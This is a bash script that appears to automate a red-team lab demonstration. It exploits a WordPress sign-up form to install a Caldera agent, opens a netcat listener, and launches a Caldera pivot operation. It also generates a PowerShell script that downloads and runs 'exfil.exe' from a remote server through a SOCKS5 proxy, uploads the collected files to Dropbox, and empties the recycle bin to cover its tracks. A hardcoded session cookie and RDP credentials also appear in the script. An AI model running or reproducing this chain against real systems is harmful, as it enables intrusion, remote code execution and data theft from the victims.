#1/bin/bash

echo "Starting autoscript for..."
sleep 2
echo "Starting autoscript for...Caldera"

x-terminal-emulator --command "nc -nlvp 8881" &

echo "Searching for vulnerability using script to target wordpress server"
python3 /DemoTools/caldera_sandcat/exploitformauto.py -u http://192.168.1.10/wordpress/sign-up/ -v

sleep 1
echo "Vulnerability check.."
sleep 1
echo "Sending payload to install Caldera"
python3 /DemoTools/caldera_sandcat/exploitformauto.py -u http://192.168.1.10/wordpress/sign-up/ -r
echo "Expect ncat to recieve a request"
sleep 50

echo "Agent being installed, now starting operation with Caldera"
curl 'http://localhost:8888/api/v2/operations' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate, br' -H 'Referer: http://localhost:8888/?' -H 'Content-Type: application/json' -H 'Origin: http://localhost:8888' -H 'Connection: keep-alive' -H 'Cookie: API_SESSION="gAAAAABl2_QAN9Axr-27TFeE7dXTs1D-38iZawbgWmp2wUuq-gn39cxtJ5J2hdnp9DS4rgukkIbijdMutmN4cySCSP9sKvah-SFth4vYsCUrizA9_sCNNo7zifwwtwQgNRFhqaf4j2jb58v__ndki7URzzavsJIogw=="' -H 'Sec-Fetch-Dest: empty' -H 'Sec-Fetch-Mode: cors' -H 'Sec-Fetch-Site: same-origin' --data-raw '{"name":"Pivot to Workstation","group":"","adversary":{"adversary_id":"20f71a21-7238-4785-8300-47e03a3cee82"},"auto_close":false,"state":"running","autonomous":1,"planner":{"id":"aaa7c857-37a0-4c4a-85f7-4e9f7f30e31a"},"source":{"id":"ed32b9c3-9593-4c33-b0db-e2007315096b"},"use_learning_parsers":true,"obfuscator":"plain-text","jitter":"2/8","visibility":"51"}' >/dev/null 2>&1
sleep 60
echo "Operation created, see Caldera > Operation > 'Workstation Pivot'"
echo "Now waiting until all tasks in Operation is complete. This will take awhile."
sleep 60

echo -e "\e[1;31mInput Dropbox access token here: (See Document)\e[0m"
read token

# Create a PowerShell script with the user's token
cat <<EOF > DropboxPowershell.txt
# Set SOCKS5 proxy configuration
\$proxyAddress = 'socks5://192.168.1.20:1080'

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;

\$url = "http://172.16.172.16:5000/downloads/exfil.exe"
\$outputPath = "\$env:USERPROFILE\Downloads\exfil.exe"

# Download file through SOCKS5 proxy using curl
\$downloadCommand = "curl.exe --socks5 \$proxyAddress --output \$outputPath --url \$url --tlsv1.2 -k"
try {
    Invoke-Expression -Command \$downloadCommand -ErrorAction Stop
    Write-Host "File downloaded successfully: \$outputPath"
} catch {
    Write-Host "Error downloading file: \$_"
}

# Execute the downloaded exe file to collect files
try {
    Start-Process -FilePath \$outputPath -Wait
    Write-Host "Executable file executed successfully: \$outputPath"
} catch {
    Write-Host "Error executing file: \$_"
}

# Dropbox upload
\$DropBoxAccessToken = "$token"
\$collectedFolderPath = "\$env:USERPROFILE\Downloads\collected"
\$files = Get-ChildItem -Path \$collectedFolderPath -File

foreach (\$file in \$files) {
    \$sourceFilePath = \$file.FullName
    \$outputFile = Split-Path \$sourceFilePath -Leaf
    \$targetFilePath = "/\$outputFile"
    \$arg = '{\"autorename\":false,\"mode\":\"add\",\"mute\":false,\"path\":\"' + \$targetFilePath + '\",\"strict_conflict\":false}'
    \$authorization = "Bearer " + \$DropBoxAccessToken
    \$headers = @{
        "Authorization"    = \$authorization
        "Dropbox-API-Arg"   = \$arg
        "Content-Type"      = 'application/octet-stream'
    }

    # Upload file to Dropbox through SOCKS5 proxy using curl
    \$uploadCommand = "curl.exe --socks5 \$proxyAddress --output NUL --url https://content.dropboxapi.com/2/files/upload --header 'Authorization: \$authorization' --header 'Dropbox-API-Arg: \$arg' --header 'Content-Type: application/octet-stream' --data-binary @\$sourceFilePath -k"
    try {
        Invoke-Expression -Command \$uploadCommand -ErrorAction Stop
        Write-Host "File uploaded to Dropbox successfully: \$sourceFilePath"
    } catch {
        Write-Host "Error uploading file: \$_"
    }
}

# Remove temporary files
Remove-Item -Path \$outputPath -Force
Clear-RecycleBin -Force
EOF
echo "Opening DropboxPowershell.txt, use this to paste in the target workstation powershell."
sleep 1
xdg-open DropboxPowershell.txt
sleep 2

echo "Creating python server to download exfil malware"
sleep 1
x-terminal-emulator --command "python3 /DemoTools/caldera_sandcat/ExfilWeb/server.py" &
sleep 10

echo "Setting Remote Desktop to target IP address"
sleep 1
rdesktop -u 'ACME.LOCAL\johnd' -p 'hackdtest123' 192.168.1.200
